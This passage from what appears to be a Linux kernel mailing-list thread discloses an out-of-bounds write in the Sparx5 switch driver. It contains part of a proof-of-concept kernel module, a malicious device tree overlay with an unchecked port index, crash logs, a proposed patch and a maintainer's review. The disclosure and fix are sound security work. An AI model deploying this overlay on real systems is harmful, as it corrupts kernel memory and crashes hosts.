         *    write at  sparx5->ports[config->portno] =3D spx5_port;       =
  */
        pr_info("poc: applying malicious overlay - probe incoming\n");
        ret =3D poc_apply_overlay(evil);
        if (ret)
                goto err_drv;

        pr_info("poc: probe returned - check dmesg for KASAN report\n");

        /* post-mortem: dump the switch device's parsed resources and repla=
y
         * the driver's exact devm_ioremap() on each one, to pinpoint which
         * window (and which parsed value) fails */
        {
                struct platform_device *pdev =3D of_find_device_by_node(sw_=
np);

                if (pdev) {
                        struct resource *r;
                        void __iomem *t;
                        int i;

                        for (i =3D 0; i < 8; i++) {
                                r =3D platform_get_resource(pdev,
IORESOURCE_MEM, i);
                                if (!r)
                                        break;
                                pr_info("poc: res[%d] =3D %pa..%pa size
%#llx name %s\n",
                                        i, &r->start, &r->end,
                                        (unsigned long long)resource_size(r=
),
                                        r->name);
                                t =3D devm_ioremap(&pdev->dev, r->start,
                                                 resource_size(r));
                                pr_info("poc: res[%d] devm_ioremap =3D
%px\n", i, t);
                                if (t)
                                        devm_iounmap(&pdev->dev, t);
                        }
                        platform_device_put(pdev);
                } else {
                        pr_err("poc: no platform device for sw_np\n");
                }
        }

        return 0;

err_drv:
        platform_driver_unregister(&poc_phy_driver);
err_root:
        of_node_put(root_np);
        return ret;
}

static void __exit poc_exit(void)
{
        if (regs_win)
                iounmap(regs_win);
        poc_remove_overlay();
        platform_driver_unregister(&poc_phy_driver);
        of_node_put(root_np);
        pr_info("poc: unloaded\n");
}

module_init(poc_init);
module_exit(poc_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("PoC: sparx5 DT reg portno OOB write (clean-kernel bug)"=
);
----8<---- end poc_sparx5_oob.c ----

7. Malicious overlay source (evil_overlay.dts)
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

----8<---- evil_overlay.dts ----
// SPDX-License-Identifier: GPL-2.0
/*
 * evil_overlay.dts - malicious device tree overlay for the Microchip Sparx=
5
 * switch driver OOB write PoC.
 *
 * The ethernet port 'reg' value is the attack payload: it is used
 * *unchecked* as an index into struct sparx5::ports[SPX5_PORTS=3D65].
 * The compiled blob is embedded into the PoC module; the placeholder
 * value 0xdeadbee1 is replaced at runtime with the chosen port number
 * (module param 'mode' or 'regno').
 *
 * The three MMIO windows mirror the register layout the driver expects
 * (sparx5.dtsi) but are backed by a RAM tail carved out of the guest
 * memory map with 'mem=3D700M' on a '-m 1G' virt machine (0x6bc00000..).
 */
/dts-v1/;
/plugin/;

/ {
        fragment@0 {
                target-path =3D "/";
                __overlay__ {
                        /* NOTE: no #address-cells/#size-cells here - the r=
oot
                         * already has 2/2 and overlays may not change it, =
so
                         * the switch node's reg below uses 2 address cells=
 +
                         * 2 size cells per tuple. */

                        pocphy: poc-stub-phy {
                                compatible =3D "poc,stub-phy";
                                #phy-cells =3D <0>;
                                status =3D "okay";
                        };

                        poc-sparx5 {
                                compatible =3D "microchip,sparx5-switch";
                                status =3D "okay";
                                #address-cells =3D <1>;
                                #size-cells =3D <1>;
                                /* cpu, dev, gcb windows (see
sparx5.dtsi reg-names).
                                 * QEMU virt root uses #address-cells=3D<2>=
 and
                                 * #size-cells=3D<2>, so each tuple is 2 ad=
dr + 2
                                 * size cells: <hi lo hi lo>. */
                                reg =3D <0x0 0x6bc00000 0x0 0x00401000>,
                                      <0x0 0x7bc04000 0x0 0x007fc000>,
                                      <0x0 0x7cc10000 0x0 0x00af0000>;

                                ethernet-ports {
                                        #address-cells =3D <1>;
                                        #size-cells =3D <0>;

                                        port@0 {
                                                reg =3D <0xdeadbee1>;
 /* evil: >=3D 65 */
                                                phy-mode =3D "sgmii";
                                                microchip,bandwidth =3D <10=
00>;
                                                phys =3D <&pocphy>;
                                                status =3D "okay";
                                        };
                                };
                        };
                };
        };
};
----8<---- end evil_overlay.dts ----

8. Evidence logs (trimmed)
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D

--- mode 0, unpatched: KASAN use-after-free at the 128 KiB boundary ---

[    6.953141] poc: applying malicious overlay - probe incoming
[    6.977682] poc-stub-phy poc-stub-phy: stub serdes PHY provider register=
ed
[    7.000621] sparx5-switch 6bc00000.poc-sparx5: MAC addr was not
set, use random MAC
[    7.001132] sparx5-switch 6bc00000.poc-sparx5: error -ENXIO: IRQ
fdma not found
[    7.001498] sparx5-switch 6bc00000.poc-sparx5: error -ENXIO: IRQ
xtr not found
[    7.001566] sparx5-switch 6bc00000.poc-sparx5: error -ENXIO: IRQ
ptp not found
[    7.006202] =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
[    7.006276] BUG: KASAN: use-after-free in
mchp_sparx5_probe+0x3464/0x4640 [sparx5_switch]
[    7.006569] Write of size 8 at addr ffff000010980000 by task insmod/71
[    7.006616]
[    7.006689] CPU: 1 UID: 0 PID: 71 Comm: insmod Tainted: G    B
O        7.4.0-rc2+ #1 PREEMPT(full)
[    7.006767] Tainted: [B]=3DBAD_PAGE, [O]=3DOOT_MODULE
[    7.006791] Hardware name: linux,dummy-virt (DT)
[    7.006831] Call trace:
[    7.006861]  show_stack+0x18/0x30 (C)
[    7.006946]  dump_stack_lvl+0x60/0x80
[    7.007006]  print_report+0x17c/0x4d8
[    7.007062]  kasan_report+0xbc/0x130
[    7.007122]  __asan_report_store8_noabort+0x20/0x30
[    7.007183]  mchp_sparx5_probe+0x3464/0x4640 [sparx5_switch]
[    7.007317]  platform_probe+0xc4/0x190
[    7.007376]  really_probe+0x17c/0x5d0
[    7.007432]  __driver_probe_device+0x234/0x340
[    7.007491]  driver_probe_device+0xe4/0x150
[    7.007548]  __device_attach_driver+0x168/0x210
[    7.007611]  bus_for_each_drv+0x108/0x1a0
[    7.007668]  __device_attach+0x16c/0x330
[    7.007740]  device_initial_probe+0x8c/0xc0
[    7.007801]  __bus_probe_device+0x54/0x120
[    7.007866]  bus_probe_device+0x10/0x20
[    7.007928]  device_add+0xc38/0x1220
[    7.008024]  of_device_add+0xdc/0x150
[    7.008090]  of_platform_device_create_pdata+0x118/0x200
[    7.008147]  of_platform_notify+0x218/0x300
[    7.008218]  blocking_notifier_call_chain+0xc4/0x130
[    7.008280]  __of_changeset_entry_notify+0x11c/0x3f0
[    7.008343]  __of_changeset_apply_notify+0x64/0xc0
[    7.008396]  of_overlay_fdt_apply+0xf50/0x16f0
[    7.008454]  poc_init+0x584/0x1000 [poc_sparx5_oob]
[    7.008534]  do_one_initcall+0xd0/0x310
[    7.008590]  do_init_module+0x234/0x6e0
[    7.008652]  load_module+0x3a44/0x4dc0
[    7.008717]  __do_sys_init_module+0x1f0/0x2e0
[    7.008777]  __arm64_sys_init_module+0x70/0xa0
[    7.008844]  invoke_syscall+0x74/0x2c0
[    7.008899]  el0_svc_common.constprop.0+0xac/0x230
[    7.008953]  do_el0_svc+0x40/0x60
[    7.009015]  el0_svc+0x38/0xa0
[    7.009078]  el0t_64_sync_handler+0xa0/0xf0
[    7.009139]  el0t_64_sync+0x198/0x19c
[    7.009203]
[    7.009226] The buggy address belongs to the physical page:
[    7.009361] page: refcount:0 mapcount:0 mapping:0000000000000000
index:0x0 pfn:0x50980
[    7.009424] flags: 0x3fffe0000000000(node=3D0|zone=3D0|lastcpupid=3D0x1f=
fff)
[    7.009548] page_type: f0(buddy)
[    7.009611] raw: 03fffe0000000000 ffff00002ba92958 ffff00002ba92958
0000000000000000
[    7.009661] raw: 0000000000000000 0000000000000007 00000000f0000000
0000000000000000
[    7.009706] page dumped because: kasan: bad access detected
[    7.009735]
[    7.009753] Memory state around the buggy address:
[    7.009793]  ffff00001097ff00: 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00
[    7.009841]  ffff00001097ff80: 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00
[    7.009875] >ffff000010980000: ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff
[    7.009903]                    ^
[    7.009943]  ffff000010980080: ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff
[    7.009994]  ffff000010980100: ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff
[    7.010027] =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

--- mode 1, unpatched: +4 GiB wild write oops ---

[    6.006952] sparx5-switch 6bc00000.poc-sparx5: MAC addr was not
set, use random MAC
[    6.007431] sparx5-switch 6bc00000.poc-sparx5: error -ENXIO: IRQ
fdma not found
[    6.007779] sparx5-switch 6bc00000.poc-sparx5: error -ENXIO: IRQ
xtr not found
[    6.007844] sparx5-switch 6bc000
** replaying previous printk message **
[    6.007844] sparx5-switch 6bc00000.poc-sparx5: error -ENXIO: IRQ
ptp not found
[    6.012493] Unable to handle kernel paging request at virtual
address ffff600022134221
[    6.012612] KASAN: probably wild-memory-access in range
[0xffff0001109a1108-0xffff0001109a110f]
[    6.012652] Mem abort info:
[    6.012679]   ESR =3D 0x0000000096000006
[    6.012748]   EC =3D 0x25: DABT (current EL), IL =3D 32 bits
[    6.012778]   SET =3D 0, FnV =3D 0
[    6.012799]   EA =3D 0, S1PTW =3D 0
[    6.012826]   FSC =3D 0x06: level 2 translation fault
[    6.012867] Data abort info:
[    6.012888]   ISV =3D 0, ISS =3D 0x00000006, ISS2 =3D 0x00000000
[    6.012913]   CM =3D 0, WnR =3D 0, TnD =3D 0
[    6.012937]   GCS =3D 0, Overlay =3D 0, DirtyBit =3D 0
[    6.013047] swapper pgtable: 4k pages, 48-bit VAs, pgdp=3D0000000044ca30=
00
[    6.013151] [ffff600022134221] pgd=3D0000000000000000,
p4d=3D000000000068c78003, pud=3D000000000068c77003, pmd=3D0000000000000000
[    6.014510] Internal error: Oops: 0000000096000006 [#1]  SMP
[    6.017369] Modules linked in: poc_sparx5_oob(O+) sparx5_switch
phylink bridge stp llc
[    6.018234] CPU: 1 UID: 0 PID: 70 Comm: insmod Tainted: G    B
O        7.4.0-rc2+ #1 PREEMPT(full)
[    6.018478] Tainted: [B]=3DBAD_PAGE, [O]=3DOOT_MODULE
[    6.018589] Hardware name: linux,dummy-virt (DT)
[    6.018878] pstate: 10000005 (nzcV daif -PAN -UAO -TCO -DIT -SSBS BTYPE=
=3D--)
[    6.019147] pc : mchp_sparx5_probe+0x1838/0x4640 [sparx5_switch]
[    6.019367] lr : mchp_sparx5_probe+0x1630/0x4640 [sparx5_switch]
[    6.019559] sp : ffff800087726a80
[    6.019664] x29: ffff800087726c40 x28: ffff000008d0af10 x27: ffff0000109=
a0080
[    6.019959] x26: dfff800000000000 x25: 1fffe000011a15e0 x24: ffff00000c1=
0c000
[    6.020166] x23: ffff80007f1ac980 x22: ffff00000c10cac0 x21: ffff80007f1=
abc60
[    6.020366] x20: 0000000020000000 x19: 1fffe000011a15e1 x18: 1ffff0000fe=
39468
[    6.020568] x17: 5f54455345525f48 x16: ffff00002ba925e0 x15: ffff8000803=
95bf0
[    6.020765] x14: ffff8000803958e0 x13: ffff800080395bf0 x12: ffff6000018=
21875
[    6.020967] x11: 1fffe00001821874 x10: ffff600001821874 x9 : dfff8000000=
00000
[    6.021213] x8 : ffff00000c10c3a7 x7 : 0000000000000001 x6 : ffff6000018=
21874
[    6.021422] x5 : ffff00000c10c3a0 x4 : ffff600001821875 x3 : 1fffe000018=
21863
[    6.021620] x2 : 000000000001088 x1 : 1fffe00022134221 x0 : ffff0001109a=
1108
[    6.021862] Call trace:
[    6.021988]  mchp_sparx5_probe+0x1838/0x4640 [sparx5_switch] (P)

--- mode 2, unpatched: reg=3D65 silent in-struct corruption, secondary
NULL write ---

[    7.401113] poc: prefilled GCB_CHIP_ID=3D0x7546000 @pa 0x7cc10000,
HSCH_RESET_CFG=3D0x1 @pa 0x7d1a7a48
[    7.403212] poc: applying malicious overlay - probe incoming
[    7.427838] poc-stub-phy poc-stub-phy: stub serdes PHY provider register=
ed
[    7.457499] sparx5-switch 6bc00000.poc-sparx5: MAC addr was not
set, use random MAC
[    7.458007] sparx5-switch 6bc00000.poc-sparx5: error -ENXIO: IRQ
fdma not found
[    7.458367] sparx5-switch 6bc00000.poc-sparx5: error -ENXIO: IRQ
xtr not found
[    7.458432] sparx5-switch 6bc00000.poc-sparx5: error -ENXIO: IRQ
ptp not found
[    7.463894] ------------[ cut here ]------------
[    7.464136] WARNING:
drivers/net/ethernet/microchip/sparx5/sparx5_main.h:796 at
sparx5_port_init+0x169c/0x1f40 [sparx5_switch], CPU#1: insmod/70
[    7.464947] Modules linked in: poc_sparx5_oob(O+) sparx5_switch
phylink bridge stp llc
[    7.466616] CPU: 1 UID: 0 PID: 70 Comm: insmod Tainted: G    B
O        7.4.0-rc2+ #1 PREEMPT(full)
[    7.466932] Tainted: [B]=3DBAD_PAGE, [O]=3DOOT_MODULE
[    7.467054] Hardware name: linux,dummy-virt (DT)
[    7.467294] pstate: 60000005 (nZcv daif -PAN -UAO -TCO -DIT -SSBS BTYPE=
=3D--)
[    7.467504] pc : sparx5_port_init+0x169c/0x1f40 [sparx5_switch]
[    7.467698] lr : sparx5_port_init+0xab8/0x1f40 [sparx5_switch]
[    7.467888] sp : ffff8000876f6970
[    7.467992] x29: ffff8000876f69a0 x28: 0000000000000001 x27: 00000000000=
00001
[    7.468282] x26: 0000000000000041 x25: 0000000088a80000 x24: 1fffe000021=
9a8c6
[...]
[    7.511290] Unable to handle kernel NULL pointer dereference at
virtual address 0000000000000004
[    7.511350] Mem abort info:
[    7.511368]   ESR =3D 0x0000000096000046
[    7.511421]   EC =3D 0x25: DABT (current EL), IL =3D 32 bits
[    7.511450]   SET =3D 0, FnV =3D 0
[    7.511470]   EA =3D 0, S1PTW =3D 0
[    7.511500]   FSC =3D 0x06: level 2 translation fault
[    7.511528] Data abort info:
[    7.511546]   ISV =3D 0, ISS =3D 0x0000000046, ISS2 =3D 0x00000000
[    7.511569]   CM =3D 0, WnR =3D 1, TnD =3D 0
[    7.511591]   GCS =3D 0, Overlay =3D 0, DirtyBit =3D 0
[    7.511723] user pgtable: 4k pages, 48-bit VAs, pgdp=3D000000004e143000
[    7.511825] [0000000000000004] pgd=3D080000004d7cd403,
p4d=3D080000004d7cd403, pud=3D00000000004e12a403, pmd=3D0000000000000000
[    7.512166] Internal error: Oops: 0000000096000046 [#1]  SMP
[    7.513622] Modules linked in: poc_sparx5_oob(O+) sparx5_switch
phylink bridge stp llc
[    7.513915] CPU: 1 UID: 0 PID: 70 Comm: insmod Tainted: G    B   W
O        7.4.0-rc2+ #1 PREEMPT(full)
[    7.514127] Tainted: [B]=3DBAD_PAGE, [W]=3DWARN, [O]=3DOOT_MODULE
[    7.514245] Hardware name: linux,dummy-virt (DT)
[    7.514349] pstate: 80000005 (Nzcv daif -PAN -UAO -TCO -DIT -SSBS BTYPE=
=3D--)
[    7.514499] pc : sparx5_port_init+0x1028/0x1f40 [sparx5_switch]

--- patched: all three modes rejected during DT parsing ---

# Patched driver (exact patch as submitted) - all three attack modes interc=
epted
# source logs: run/evidence-emailpatch-mode{0,1,2}.log

--- mode 0 ---
[    7.553690] sparx5-switch 6bc00000.poc-sparx5: port 15839: reg out of ra=
nge
driver KASAN reports / oopses: 0
--- mode 1 ---
[    7.299818] sparx5-switch 6bc00000.poc-sparx5: port 536870912: reg
out of range
driver KASAN reports / oopses: 0
--- mode 2 ---
[    7.099245] sparx5-switch 6bc00000.poc-sparx5: port 65: reg out of range
driver KASAN reports / oopses: 0

Daniel Machon <daniel.machon@microchip.com> =E4=BA=8E2026=E5=B9=B411=E6=9C=
=8816=E6=97=A5=E5=91=A8=E4=B8=80 06:13=E5=86=99=E9=81=93=EF=BC=9A
>
> Hi,
>
> > From: Haoran Wang <wanghr2026@mail.zgclab.edu.cn>
> > Date: Fri, 13 Nov 2026 19:42:25 +0800
> > Subject: [PATCH net-next] net: sparx5: check DT port reg against array =
size
> >
> > mchp_sparx5_probe() reads the 'reg' property of each ethernet-port DT
> > node into portno and passes it to sparx5_create_port(), which uses it
> > to index the fixed-size sparx5->ports[SPX5_PORTS] array:
> >
> >     sparx5->ports[config->portno] =3D spx5_port;
> >
> > The value is never validated, so a device tree with an out-of-range
> > 'reg' value (runtime overlay, corrupted or attacker-controlled DTB,
> > kexec-supplied or bootloader-fixed-up DT) turns probe into an
> > out-of-bounds write, potentially far outside the allocation.
>
> I seem to remember that these type of checks have been rejected with "dev=
ice
> tree is considered trusted". Though, we do the same check in lan966x, so =
I am
> not entirely sure.
>
> >
> > Add a range check while parsing and skip nodes with an invalid port
> > number.
> >
> > Fixes: f3cad2611a77 ("net: sparx5: add hostmode with phylink support")
> > Signed-off-by: Haoran Wang <wanghr2026@mail.zgclab.edu.cn>
> > ---
> >  drivers/net/ethernet/microchip/sparx5/sparx5_main.c | 5 +++++
> >  1 file changed, 5 insertions(+)
> >
> > diff --git a/drivers/net/ethernet/microchip/sparx5/sparx5_main.c b/driv=
ers/net/ethernet/microchip/sparx5/sparx5_main.c
> > index 08a398adf121..6616e76bd0e3 100644
> > --- a/drivers/net/ethernet/microchip/sparx5/sparx5_main.c
> > +++ b/drivers/net/ethernet/microchip/sparx5/sparx5_main.c
> > @@ -845,6 +845,11 @@ static int mchp_sparx5_probe(struct platform_devic=
e *pdev)
> >                       dev_err(sparx5->dev, "port reg property error\n")=
;
> >                       continue;
> >               }
> > +             if (portno >=3D SPX5_PORTS) {
>
> This wont do.
>
> SPX5_PORTS is the size of ports[], which matches the sparx5 port count.
> lan969x goes through the same probe but has only 30 ports.
>
> Instead do:
>
>         if (portno >=3D sparx5->data->consts->n_ports)
>
>
> > +                     dev_err(sparx5->dev, "port %u: reg out of range\n=
",
> > +                             portno);
> > +                     continue;
> > +             }
> >               config =3D &configs[idx];
> >               conf =3D &config->conf;
> >               conf->speed =3D SPEED_UNKNOWN;
> > --
> > 2.43.0
>
> Since a v2 is needed anyway, please also add what the bot asked for to th=
e
> commit message, and properly populate To and CC with get_maintainers.pl
>
> Thanks,
> Daniel
>
> pw-bot: cr
